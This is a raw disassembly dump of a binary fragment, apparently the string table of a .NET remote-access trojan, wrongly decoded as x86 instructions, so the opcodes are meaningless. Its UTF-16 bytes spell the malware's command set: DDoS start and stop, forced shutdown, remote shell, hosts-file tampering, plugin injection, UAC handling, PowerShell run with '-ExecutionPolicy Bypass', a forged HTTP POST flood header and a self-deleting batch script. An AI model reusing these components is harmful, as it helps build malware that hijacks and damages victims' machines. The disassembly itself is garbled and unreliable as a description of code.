  408ffa:	07                   	pop    %es
  408ffb:	20 00                	and    %al,(%eax)
  408ffd:	47                   	inc    %edi
  408ffe:	00 42 00             	add    %al,0x0(%edx)
  409001:	00 07                	add    %al,(%edi)
  409003:	20 00                	and    %al,(%eax)
  409005:	4d                   	dec    %ebp
  409006:	00 42 00             	add    %al,0x0(%edx)
  409009:	00 0b                	add    %cl,(%ebx)
  40900b:	53                   	push   %ebx
  40900c:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  409010:	00 72 00             	add    %dh,0x0(%edx)
  409013:	74 00                	je     0x409015
  409015:	00 03                	add    %al,(%ebx)
  409017:	00 00                	add    %al,(%eax)
  409019:	01 0b                	add    %ecx,(%ebx)
  40901b:	50                   	push   %eax
  40901c:	00 49 00             	add    %cl,0x0(%ecx)
  40901f:	4e                   	dec    %esi
  409020:	00 47 00             	add    %al,0x0(%edi)
  409023:	21 00                	and    %eax,(%eax)
  409025:	00 09                	add    %cl,(%ecx)
  409027:	70 00                	jo     0x409029
  409029:	6f                   	outsl  %ds:(%esi),(%dx)
  40902a:	00 6e 00             	add    %ch,0x0(%esi)
  40902d:	67 00 00             	add    %al,(%bx,%si)
  409030:	07                   	pop    %es
  409031:	72 00                	jb     0x409033
  409033:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409037:	00 0b                	add    %cl,(%ebx)
  409039:	43                   	inc    %ebx
  40903a:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40903e:	00 53 00             	add    %dl,0x0(%ebx)
  409041:	45                   	inc    %ebp
  409042:	00 00                	add    %al,(%eax)
  409044:	13 75 00             	adc    0x0(%ebp),%esi
  409047:	6e                   	outsb  %ds:(%esi),(%dx)
  409048:	00 69 00             	add    %ch,0x0(%ecx)
  40904b:	6e                   	outsb  %ds:(%esi),(%dx)
  40904c:	00 73 00             	add    %dh,0x0(%ebx)
  40904f:	74 00                	je     0x409051
  409051:	61                   	popa
  409052:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409056:	00 00                	add    %al,(%eax)
  409058:	0d 75 00 70 00       	or     $0x700075,%eax
  40905d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409061:	74 00                	je     0x409063
  409063:	65 00 00             	add    %al,%gs:(%eax)
  409066:	05 44 00 57 00       	add    $0x570044,%eax
  40906b:	00 05 46 00 4d 00    	add    %al,0x4d0046
  409071:	00 05 4c 00 4e 00    	add    %al,0x4e004c
  409077:	00 0f                	add    %cl,(%edi)
  409079:	55                   	push   %ebp
  40907a:	00 72 00             	add    %dh,0x0(%edx)
  40907d:	6c                   	insb   (%dx),%es:(%edi)
  40907e:	00 6f 00             	add    %ch,0x0(%edi)
  409081:	70 00                	jo     0x409083
  409083:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409087:	00 0f                	add    %cl,(%edi)
  409089:	55                   	push   %ebp
  40908a:	00 72 00             	add    %dh,0x0(%edx)
  40908d:	6c                   	insb   (%dx),%es:(%edi)
  40908e:	00 68 00             	add    %ch,0x0(%eax)
  409091:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  409097:	00 15 50 00 43 00    	add    %dl,0x430050
  40909d:	53                   	push   %ebx
  40909e:	00 68 00             	add    %ch,0x0(%eax)
  4090a1:	75 00                	jne    0x4090a3
  4090a3:	74 00                	je     0x4090a5
  4090a5:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4090a9:	77 00                	ja     0x4090ab
  4090ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ac:	00 00                	add    %al,(%eax)
  4090ae:	2f                   	das
  4090af:	73 00                	jae    0x4090b1
  4090b1:	68 00 75 00 74       	push   $0x74007500
  4090b6:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4090ba:	00 77 00             	add    %dh,0x0(%edi)
  4090bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4090be:	00 2e                	add    %ch,(%esi)
  4090c0:	00 65 00             	add    %ah,0x0(%ebp)
  4090c3:	78 00                	js     0x4090c5
  4090c5:	65 00 20             	add    %ah,%gs:(%eax)
  4090c8:	00 2f                	add    %ch,(%edi)
  4090ca:	00 66 00             	add    %ah,0x0(%esi)
  4090cd:	20 00                	and    %al,(%eax)
  4090cf:	2f                   	das
  4090d0:	00 73 00             	add    %dh,0x0(%ebx)
  4090d3:	20 00                	and    %al,(%eax)
  4090d5:	2f                   	das
  4090d6:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  4090da:	00 30                	add    %dh,(%eax)
  4090dc:	00 00                	add    %al,(%eax)
  4090de:	13 50 00             	adc    0x0(%eax),%edx
  4090e1:	43                   	inc    %ebx
  4090e2:	00 52 00             	add    %dl,0x0(%edx)
  4090e5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4090e9:	74 00                	je     0x4090eb
  4090eb:	61                   	popa
  4090ec:	00 72 00             	add    %dh,0x0(%edx)
  4090ef:	74 00                	je     0x4090f1
  4090f1:	00 2f                	add    %ch,(%edi)
  4090f3:	73 00                	jae    0x4090f5
  4090f5:	68 00 75 00 74       	push   $0x74007500
  4090fa:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4090fe:	00 77 00             	add    %dh,0x0(%edi)
  409101:	6e                   	outsb  %ds:(%esi),(%dx)
  409102:	00 2e                	add    %ch,(%esi)
  409104:	00 65 00             	add    %ah,0x0(%ebp)
  409107:	78 00                	js     0x409109
  409109:	65 00 20             	add    %ah,%gs:(%eax)
  40910c:	00 2f                	add    %ch,(%edi)
  40910e:	00 66 00             	add    %ah,0x0(%esi)
  409111:	20 00                	and    %al,(%eax)
  409113:	2f                   	das
  409114:	00 72 00             	add    %dh,0x0(%edx)
  409117:	20 00                	and    %al,(%eax)
  409119:	2f                   	das
  40911a:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40911e:	00 30                	add    %dh,(%eax)
  409120:	00 00                	add    %al,(%eax)
  409122:	11 50 00             	adc    %edx,0x0(%eax)
  409125:	43                   	inc    %ebx
  409126:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40912a:	00 67 00             	add    %ah,0x0(%edi)
  40912d:	6f                   	outsl  %ds:(%esi),(%dx)
  40912e:	00 66 00             	add    %ah,0x0(%esi)
  409131:	66 00 00             	data16 add %al,(%eax)
  409134:	1f                   	pop    %ds
  409135:	73 00                	jae    0x409137
  409137:	68 00 75 00 74       	push   $0x74007500
  40913c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409140:	00 77 00             	add    %dh,0x0(%edi)
  409143:	6e                   	outsb  %ds:(%esi),(%dx)
  409144:	00 2e                	add    %ch,(%esi)
  409146:	00 65 00             	add    %ah,0x0(%ebp)
  409149:	78 00                	js     0x40914b
  40914b:	65 00 20             	add    %ah,%gs:(%eax)
  40914e:	00 2d 00 4c 00 01    	add    %ch,0x1004c00
  409154:	11 52 00             	adc    %edx,0x0(%edx)
  409157:	75 00                	jne    0x409159
  409159:	6e                   	outsb  %ds:(%esi),(%dx)
  40915a:	00 53 00             	add    %dl,0x0(%ebx)
  40915d:	68 00 65 00 6c       	push   $0x6c006500
  409162:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409166:	13 53 00             	adc    0x0(%ebx),%edx
  409169:	74 00                	je     0x40916b
  40916b:	61                   	popa
  40916c:	00 72 00             	add    %dh,0x0(%edx)
  40916f:	74 00                	je     0x409171
  409171:	44                   	inc    %esp
  409172:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409176:	00 73 00             	add    %dh,0x0(%ebx)
  409179:	00 11                	add    %dl,(%ecx)
  40917b:	53                   	push   %ebx
  40917c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409180:	00 70 00             	add    %dh,0x0(%eax)
  409183:	44                   	inc    %esp
  409184:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409188:	00 73 00             	add    %dh,0x0(%ebx)
  40918b:	00 17                	add    %dl,(%edi)
  40918d:	53                   	push   %ebx
  40918e:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  409192:	00 72 00             	add    %dh,0x0(%edx)
  409195:	74 00                	je     0x409197
  409197:	52                   	push   %edx
  409198:	00 65 00             	add    %ah,0x0(%ebp)
  40919b:	70 00                	jo     0x40919d
  40919d:	6f                   	outsl  %ds:(%esi),(%dx)
  40919e:	00 72 00             	add    %dh,0x0(%edx)
  4091a1:	74 00                	je     0x4091a3
  4091a3:	00 15 53 00 74 00    	add    %dl,0x740053
  4091a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091aa:	00 70 00             	add    %dh,0x0(%eax)
  4091ad:	52                   	push   %edx
  4091ae:	00 65 00             	add    %ah,0x0(%ebp)
  4091b1:	70 00                	jo     0x4091b3
  4091b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b4:	00 72 00             	add    %dh,0x0(%edx)
  4091b7:	74 00                	je     0x4091b9
  4091b9:	00 0b                	add    %cl,(%ebx)
  4091bb:	58                   	pop    %eax
  4091bc:	00 63 00             	add    %ah,0x0(%ebx)
  4091bf:	68 00 61 00 74       	push   $0x74006100
  4091c4:	00 00                	add    %al,(%eax)
  4091c6:	0b 48 00             	or     0x0(%eax),%ecx
  4091c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ca:	00 73 00             	add    %dh,0x0(%ebx)
  4091cd:	74 00                	je     0x4091cf
  4091cf:	73 00                	jae    0x4091d1
  4091d1:	00 25 5c 00 64 00    	add    %ah,0x64005c
  4091d7:	72 00                	jb     0x4091d9
  4091d9:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  4091df:	72 00                	jb     0x4091e1
  4091e1:	73 00                	jae    0x4091e3
  4091e3:	5c                   	pop    %esp
  4091e4:	00 65 00             	add    %ah,0x0(%ebp)
  4091e7:	74 00                	je     0x4091e9
  4091e9:	63 00                	arpl   %eax,(%eax)
  4091eb:	5c                   	pop    %esp
  4091ec:	00 68 00             	add    %ch,0x0(%eax)
  4091ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f0:	00 73 00             	add    %dh,0x0(%ebx)
  4091f3:	74 00                	je     0x4091f5
  4091f5:	73 00                	jae    0x4091f7
  4091f7:	00 0d 53 00 68 00    	add    %cl,0x680053
  4091fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fe:	00 73 00             	add    %dh,0x0(%ebx)
  409201:	74 00                	je     0x409203
  409203:	73 00                	jae    0x409205
  409205:	00 11                	add    %dl,(%ecx)
  409207:	48                   	dec    %eax
  409208:	00 6f 00             	add    %ch,0x0(%edi)
  40920b:	73 00                	jae    0x40920d
  40920d:	74 00                	je     0x40920f
  40920f:	73 00                	jae    0x409211
  409211:	4d                   	dec    %ebp
  409212:	00 53 00             	add    %dl,0x0(%ebx)
  409215:	47                   	inc    %edi
  409216:	00 00                	add    %al,(%eax)
  409218:	2d 4d 00 6f 00       	sub    $0x6f004d,%eax
  40921d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409221:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  409225:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40922a:	00 73 00             	add    %dh,0x0(%ebx)
  40922d:	75 00                	jne    0x40922f
  40922f:	63 00                	arpl   %eax,(%eax)
  409231:	63 00                	arpl   %eax,(%eax)
  409233:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409237:	73 00                	jae    0x409239
  409239:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40923d:	6c                   	insb   (%dx),%es:(%edi)
  40923e:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  409242:	00 21                	add    %ah,(%ecx)
  409244:	00 00                	add    %al,(%eax)
  409246:	11 48 00             	adc    %ecx,0x0(%eax)
  409249:	6f                   	outsl  %ds:(%esi),(%dx)
  40924a:	00 73 00             	add    %dh,0x0(%ebx)
  40924d:	74 00                	je     0x40924f
  40924f:	73 00                	jae    0x409251
  409251:	45                   	inc    %ebp
  409252:	00 72 00             	add    %dh,0x0(%edx)
  409255:	72 00                	jb     0x409257
  409257:	00 09                	add    %cl,(%ecx)
  409259:	44                   	inc    %esp
  40925a:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40925e:	00 73 00             	add    %dh,0x0(%ebx)
  409261:	00 0d 70 00 6c 00    	add    %cl,0x6c0070
  409267:	75 00                	jne    0x409269
  409269:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40926d:	6e                   	outsb  %ds:(%esi),(%dx)
  40926e:	00 00                	add    %al,(%eax)
  409270:	15 73 00 65 00       	adc    $0x650073,%eax
  409275:	6e                   	outsb  %ds:(%esi),(%dx)
  409276:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40927a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40927e:	00 67 00             	add    %ah,0x0(%edi)
  409281:	69 00 6e 00 00 15    	imul   $0x1500006e,(%eax),%eax
  409287:	73 00                	jae    0x409289
  409289:	61                   	popa
  40928a:	00 76 00             	add    %dh,0x0(%esi)
  40928d:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  409291:	6c                   	insb   (%dx),%es:(%edi)
  409292:	00 75 00             	add    %dh,0x0(%ebp)
  409295:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409299:	6e                   	outsb  %ds:(%esi),(%dx)
  40929a:	00 00                	add    %al,(%eax)
  40929c:	1b 52 00             	sbb    0x0(%edx),%edx
  40929f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4092a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092a4:	00 76 00             	add    %dh,0x0(%esi)
  4092a7:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  4092ab:	6c                   	insb   (%dx),%es:(%edi)
  4092ac:	00 75 00             	add    %dh,0x0(%ebp)
  4092af:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4092b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b4:	00 73 00             	add    %dh,0x0(%ebx)
  4092b7:	00 21                	add    %ah,(%ecx)
  4092b9:	50                   	push   %eax
  4092ba:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4092be:	00 67 00             	add    %ah,0x0(%edi)
  4092c1:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  4092c7:	20 00                	and    %al,(%eax)
  4092c9:	52                   	push   %edx
  4092ca:	00 65 00             	add    %ah,0x0(%ebp)
  4092cd:	6d                   	insl   (%dx),%es:(%edi)
  4092ce:	00 6f 00             	add    %ch,0x0(%edi)
  4092d1:	76 00                	jbe    0x4092d3
  4092d3:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  4092d8:	00 00                	add    %al,(%eax)
  4092da:	15 4f 00 66 00       	adc    $0x66004f,%eax
  4092df:	66 00 6c 00 69       	data16 add %ch,0x69(%eax,%eax,1)
  4092e4:	00 6e 00             	add    %ch,0x0(%esi)
  4092e7:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  4092eb:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  4092f0:	09 24 00             	or     %esp,(%eax,%eax,1)
  4092f3:	43                   	inc    %ebx
  4092f4:	00 61 00             	add    %ah,0x0(%ecx)
  4092f7:	70 00                	jo     0x4092f9
  4092f9:	00 09                	add    %cl,(%ecx)
  4092fb:	23 00                	and    (%eax),%eax
  4092fd:	43                   	inc    %ebx
  4092fe:	00 41 00             	add    %al,0x0(%ecx)
  409301:	50                   	push   %eax
  409302:	00 00                	add    %al,(%eax)
  409304:	0d 50 00 6c 00       	or     $0x6c0050,%eax
  409309:	75 00                	jne    0x40930b
  40930b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40930f:	6e                   	outsb  %ds:(%esi),(%dx)
  409310:	00 00                	add    %al,(%eax)
  409312:	07                   	pop    %es
  409313:	52                   	push   %edx
  409314:	00 75 00             	add    %dh,0x0(%ebp)
  409317:	6e                   	outsb  %ds:(%esi),(%dx)
  409318:	00 00                	add    %al,(%eax)
  40931a:	0d 49 00 6e 00       	or     $0x6e0049,%eax
  40931f:	76 00                	jbe    0x409321
  409321:	6f                   	outsl  %ds:(%esi),(%dx)
  409322:	00 6b 00             	add    %ch,0x0(%ebx)
  409325:	65 00 00             	add    %al,%gs:(%eax)
  409328:	17                   	pop    %ss
  409329:	52                   	push   %edx
  40932a:	00 75 00             	add    %dh,0x0(%ebp)
  40932d:	6e                   	outsb  %ds:(%esi),(%dx)
  40932e:	00 52 00             	add    %dl,0x0(%edx)
  409331:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409335:	6f                   	outsl  %ds:(%esi),(%dx)
  409336:	00 76 00             	add    %dh,0x0(%esi)
  409339:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40933d:	79 00                	jns    0x40933f
  40933f:	00 11                	add    %dl,(%ecx)
  409341:	52                   	push   %edx
  409342:	00 65 00             	add    %ah,0x0(%ebp)
  409345:	63 00                	arpl   %eax,(%eax)
  409347:	6f                   	outsl  %ds:(%esi),(%dx)
  409348:	00 76 00             	add    %dh,0x0(%esi)
  40934b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40934f:	79 00                	jns    0x409351
  409351:	00 15 52 00 75 00    	add    %dl,0x750052
  409357:	6e                   	outsb  %ds:(%esi),(%dx)
  409358:	00 4f 00             	add    %cl,0x0(%edi)
  40935b:	70 00                	jo     0x40935d
  40935d:	74 00                	je     0x40935f
  40935f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409365:	73 00                	jae    0x409367
  409367:	00 0d 69 00 6e 00    	add    %cl,0x6e0069
  40936d:	6a 00                	push   $0x0
  40936f:	52                   	push   %edx
  409370:	00 75 00             	add    %dh,0x0(%ebp)
  409373:	6e                   	outsb  %ds:(%esi),(%dx)
  409374:	00 00                	add    %al,(%eax)
  409376:	0f 55 00             	andnps (%eax),%xmm0
  409379:	41                   	inc    %ecx
  40937a:	00 43 00             	add    %al,0x0(%ebx)
  40937d:	46                   	inc    %esi
  40937e:	00 75 00             	add    %dh,0x0(%ebp)
  409381:	6e                   	outsb  %ds:(%esi),(%dx)
  409382:	00 63 00             	add    %ah,0x0(%ebx)
  409385:	00 07                	add    %al,(%edi)
  409387:	45                   	inc    %ebp
  409388:	00 4e 00             	add    %cl,0x0(%esi)
  40938b:	43                   	inc    %ebx
  40938c:	00 00                	add    %al,(%eax)
  40938e:	07                   	pop    %es
  40938f:	44                   	inc    %esp
  409390:	00 45 00             	add    %al,0x0(%ebp)
  409393:	43                   	inc    %ebx
  409394:	00 00                	add    %al,(%eax)
  409396:	1d 50 00 6c 00       	sbb    $0x6c0050,%eax
  40939b:	75 00                	jne    0x40939d
  40939d:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4093a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a2:	00 20                	add    %ah,(%eax)
  4093a4:	00 45 00             	add    %al,0x0(%ebp)
  4093a7:	72 00                	jb     0x4093a9
  4093a9:	72 00                	jb     0x4093ab
  4093ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ac:	00 72 00             	add    %dh,0x0(%edx)
  4093af:	21 00                	and    %eax,(%eax)
  4093b1:	20 00                	and    %al,(%eax)
  4093b3:	00 07                	add    %al,(%edi)
  4093b5:	4d                   	dec    %ebp
  4093b6:	00 73 00             	add    %dh,0x0(%ebx)
  4093b9:	67 00 00             	add    %al,(%bx,%si)
  4093bc:	0f 54 00             	andps  (%eax),%xmm0
  4093bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c0:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  4093c4:	00 77 00             	add    %dh,0x0(%edi)
  4093c7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4093cb:	00 0d 4f 00 70 00    	add    %cl,0x70004f
  4093d1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4093d5:	20 00                	and    %al,(%eax)
  4093d7:	5b                   	pop    %ebx
  4093d8:	00 00                	add    %al,(%eax)
  4093da:	03 5d 00             	add    0x0(%ebp),%ebx
  4093dd:	00 07                	add    %al,(%edi)
  4093df:	47                   	inc    %edi
  4093e0:	00 45 00             	add    %al,0x0(%ebp)
  4093e3:	54                   	push   %esp
  4093e4:	00 00                	add    %al,(%eax)
  4093e6:	09 2e                	or     %ebp,(%esi)
  4093e8:	00 70 00             	add    %dh,0x0(%eax)
  4093eb:	73 00                	jae    0x4093ed
  4093ed:	31 00                	xor    %eax,(%eax)
  4093ef:	00 1d 70 00 6f 00    	add    %bl,0x6f0070
  4093f5:	77 00                	ja     0x4093f7
  4093f7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4093fb:	73 00                	jae    0x4093fd
  4093fd:	68 00 65 00 6c       	push   $0x6c006500
  409402:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  409406:	00 65 00             	add    %ah,0x0(%ebp)
  409409:	78 00                	js     0x40940b
  40940b:	65 00 00             	add    %al,%gs:(%eax)
  40940e:	3f                   	aas
  40940f:	2d 00 45 00 78       	sub    $0x78004500,%eax
  409414:	00 65 00             	add    %ah,0x0(%ebp)
  409417:	63 00                	arpl   %eax,(%eax)
  409419:	75 00                	jne    0x40941b
  40941b:	74 00                	je     0x40941d
  40941d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409423:	50                   	push   %eax
  409424:	00 6f 00             	add    %ch,0x0(%edi)
  409427:	6c                   	insb   (%dx),%es:(%edi)
  409428:	00 69 00             	add    %ch,0x0(%ecx)
  40942b:	63 00                	arpl   %eax,(%eax)
  40942d:	79 00                	jns    0x40942f
  40942f:	20 00                	and    %al,(%eax)
  409431:	42                   	inc    %edx
  409432:	00 79 00             	add    %bh,0x0(%ecx)
  409435:	70 00                	jo     0x409437
  409437:	61                   	popa
  409438:	00 73 00             	add    %dh,0x0(%ebx)
  40943b:	73 00                	jae    0x40943d
  40943d:	20 00                	and    %al,(%eax)
  40943f:	2d 00 46 00 69       	sub    $0x69004600,%eax
  409444:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409448:	00 20                	add    %ah,(%eax)
  40944a:	00 22                	add    %ah,(%edx)
  40944c:	00 01                	add    %al,(%ecx)
  40944e:	03 22                	add    (%edx),%esp
  409450:	00 00                	add    %al,(%eax)
  409452:	2f                   	das
  409453:	50                   	push   %eax
  409454:	00 4f 00             	add    %cl,0x0(%edi)
  409457:	53                   	push   %ebx
  409458:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40945c:	00 2f                	add    %ch,(%edi)
  40945e:	00 20                	add    %ah,(%eax)
  409460:	00 48 00             	add    %cl,0x0(%eax)
  409463:	54                   	push   %esp
  409464:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  409468:	00 2f                	add    %ch,(%edi)
  40946a:	00 31                	add    %dh,(%ecx)
  40946c:	00 2e                	add    %ch,(%esi)
  40946e:	00 31                	add    %dh,(%ecx)
  409470:	00 0d 00 0a 00 48    	add    %cl,0x48000a00
  409476:	00 6f 00             	add    %ch,0x0(%edi)
  409479:	73 00                	jae    0x40947b
  40947b:	74 00                	je     0x40947d
  40947d:	3a 00                	cmp    (%eax),%al
  40947f:	20 00                	and    %al,(%eax)
  409481:	00 80 af 0d 00 0a    	add    %al,0xa000daf(%eax)
  409487:	00 43 00             	add    %al,0x0(%ebx)
  40948a:	6f                   	outsl  %ds:(%esi),(%dx)
  40948b:	00 6e 00             	add    %ch,0x0(%esi)
  40948e:	6e                   	outsb  %ds:(%esi),(%dx)
  40948f:	00 65 00             	add    %ah,0x0(%ebp)
  409492:	63 00                	arpl   %eax,(%eax)
  409494:	74 00                	je     0x409496
  409496:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40949c:	3a 00                	cmp    (%eax),%al
  40949e:	20 00                	and    %al,(%eax)
  4094a0:	6b 00 65             	imul   $0x65,(%eax),%eax
  4094a3:	00 65 00             	add    %ah,0x0(%ebp)
  4094a6:	70 00                	jo     0x4094a8
  4094a8:	2d 00 61 00 6c       	sub    $0x6c006100,%eax
  4094ad:	00 69 00             	add    %ch,0x0(%ecx)
  4094b0:	76 00                	jbe    0x4094b2
  4094b2:	65 00 0d 00 0a 00 43 	add    %cl,%gs:0x43000a00
  4094b9:	00 6f 00             	add    %ch,0x0(%edi)
  4094bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094bd:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4094c1:	00 6e 00             	add    %ch,0x0(%esi)
  4094c4:	74 00                	je     0x4094c6
  4094c6:	2d 00 54 00 79       	sub    $0x79005400,%eax
  4094cb:	00 70 00             	add    %dh,0x0(%eax)
  4094ce:	65 00 3a             	add    %bh,%gs:(%edx)
  4094d1:	00 20                	add    %ah,(%eax)
  4094d3:	00 61 00             	add    %ah,0x0(%ecx)
  4094d6:	70 00                	jo     0x4094d8
  4094d8:	70 00                	jo     0x4094da
  4094da:	6c                   	insb   (%dx),%es:(%edi)
  4094db:	00 69 00             	add    %ch,0x0(%ecx)
  4094de:	63 00                	arpl   %eax,(%eax)
  4094e0:	61                   	popa
  4094e1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4094e5:	00 6f 00             	add    %ch,0x0(%edi)
  4094e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e9:	00 2f                	add    %ch,(%edi)
  4094eb:	00 78 00             	add    %bh,0x0(%eax)
  4094ee:	2d 00 77 00 77       	sub    $0x77007700,%eax
  4094f3:	00 77 00             	add    %dh,0x0(%edi)
  4094f6:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
  4094fb:	00 72 00             	add    %dh,0x0(%edx)
  4094fe:	6d                   	insl   (%dx),%es:(%edi)
  4094ff:	00 2d 00 75 00 72    	add    %ch,0x72007500
  409505:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409509:	00 6e 00             	add    %ch,0x0(%esi)
  40950c:	63 00                	arpl   %eax,(%eax)
  40950e:	6f                   	outsl  %ds:(%esi),(%dx)
  40950f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409513:	00 64 00 0d          	add    %ah,0xd(%eax,%eax,1)
  409517:	00 0a                	add    %cl,(%edx)
  409519:	00 55 00             	add    %dl,0x0(%ebp)
  40951c:	73 00                	jae    0x40951e
  40951e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409522:	2d 00 41 00 67       	sub    $0x67004100,%eax
  409527:	00 65 00             	add    %ah,0x0(%ebp)
  40952a:	6e                   	outsb  %ds:(%esi),(%dx)
  40952b:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  40952f:	00 20                	add    %ah,(%eax)
  409531:	00 01                	add    %al,(%ecx)
  409533:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  409538:	43                   	inc    %ebx
  409539:	00 6f 00             	add    %ch,0x0(%edi)
  40953c:	6e                   	outsb  %ds:(%esi),(%dx)
  40953d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409541:	00 6e 00             	add    %ch,0x0(%esi)
  409544:	74 00                	je     0x409546
  409546:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  40954b:	00 6e 00             	add    %ch,0x0(%esi)
  40954e:	67 00 74 00          	add    %dh,0x0(%si)
  409552:	68 00 3a 00 20       	push   $0x20003a00
  409557:	00 35 00 32 00 33    	add    %dh,0x33003200
  40955d:	00 35 00 0d 00 0a    	add    %dh,0xa000d00
  409563:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  409569:	09 2e                	or     %ebp,(%esi)
  40956b:	00 62 00             	add    %ah,0x0(%edx)
  40956e:	61                   	popa
  40956f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  409573:	13 40 00             	adc    0x0(%eax),%eax
  409576:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40957a:	68 00 6f 00 20       	push   $0x20006f00
  40957f:	00 6f 00             	add    %ch,0x0(%edi)
  409582:	66 00 66 00          	data16 add %ah,0x0(%esi)
  409586:	00 1f                	add    %bl,(%edi)
  409588:	74 00                	je     0x40958a
  40958a:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  409590:	6f                   	outsl  %ds:(%esi),(%dx)
  409591:	00 75 00             	add    %dh,0x0(%ebp)
  409594:	74 00                	je     0x409596
  409596:	20 00                	and    %al,(%eax)
  409598:	33 00                	xor    (%eax),%eax
  40959a:	20 00                	and    %al,(%eax)
  40959c:	3e 00 20             	add    %ah,%ds:(%eax)
  40959f:	00 4e 00             	add    %cl,0x0(%esi)
  4095a2:	55                   	push   %ebp
  4095a3:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4095a7:	07                   	pop    %es
  4095a8:	43                   	inc    %ebx
  4095a9:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4095ad:	00 00                	add    %al,(%eax)
  4095af:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  4095b3:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  4095b7:	00 22                	add    %ah,(%edx)
  4095b9:	00 00                	add    %al,(%eax)
  4095bb:	0f 22 00             	mov    %eax,%cr0
  4095be:	20 00                	and    %al,(%eax)
  4095c0:	2f                   	das
  4095c1:	00 66 00             	add    %ah,0x0(%esi)
  4095c4:	20 00                	and    %al,(%eax)
  4095c6:	2f                   	das
  4095c7:	00 71 00             	add    %dh,0x0(%ecx)
  4095ca:	00 0f                	add    %cl,(%edi)
  4095cc:	54                   	push   %esp
  4095cd:	00 6f 00             	add    %ch,0x0(%edi)
